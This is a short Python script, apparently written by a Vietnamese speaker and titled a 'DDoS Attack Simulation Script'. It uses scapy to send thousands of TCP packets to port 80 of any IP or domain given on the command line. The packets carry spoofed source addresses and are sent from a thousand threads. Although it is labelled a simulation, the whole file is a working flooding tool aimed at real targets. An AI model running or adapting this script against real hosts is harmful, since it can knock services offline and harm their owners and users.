import argparse
import socket
from scapy.all import IP, TCP, send
import random
import time
import threading

# === CONFIG ===
PACKETS_PER_IP = 1000      # Số gói tin mỗi IP gửi
NUM_IPS = 1000             # Số IP nguồn giả lập
DURATION_PER_IP = 5        # Thời gian tối đa mỗi IP gửi gói (giây), dùng để điều tiết tốc độ

def generate_random_ip():
    # Tạo IP ngẫu nhiên trong lớp riêng (private IP)
    return f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"

def send_packets_from_ip(source_ip, target_ip, packets=PACKETS_PER_IP, duration=DURATION_PER_IP):
    start_time = time.time()
    for _ in range(packets):
        packet = IP(src=source_ip, dst=target_ip) / TCP(
            sport=random.randint(1024, 65535), dport=80
        )
        send(packet, verbose=0)
        time.sleep(duration / packets)  # Giữ tốc độ gửi ổn định
    elapsed = time.time() - start_time
    print(f"IP {source_ip} finished sending {packets} packets in {elapsed:.2f} seconds")

def simulate_ddos(target):
    # Loại bỏ http://, https:// và dấu /
    target = target.replace("http://", "").replace("https://", "").strip("/")

    # Resolve domain sang IP nếu cần
    try:
        target_ip = socket.gethostbyname(target)
    except socket.gaierror:
        print(f"[ERROR] Cannot resolve domain or invalid IP: {target}")
        return

    print(f"Simulating DDoS attack to {target} ({target_ip}) from {NUM_IPS} spoofed IPs, each sending {PACKETS_PER_IP} packets...")

    threads = []
    for i in range(NUM_IPS):
        source_ip = generate_random_ip()
        print(f"Starting thread for IP #{i+1}/{NUM_IPS}: {source_ip}")
        t = threading.Thread(target=send_packets_from_ip, args=(source_ip, target_ip))
        t.start()
        threads.append(t)

    # Đợi tất cả luồng gửi xong
    for t in threads:
        t.join()

    print("Attack simulation finished.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS Attack Simulation Script")
    parser.add_argument("target_ip", help="Target IP or domain to attack")
    args = parser.parse_args()

    simulate_ddos(args.target_ip)
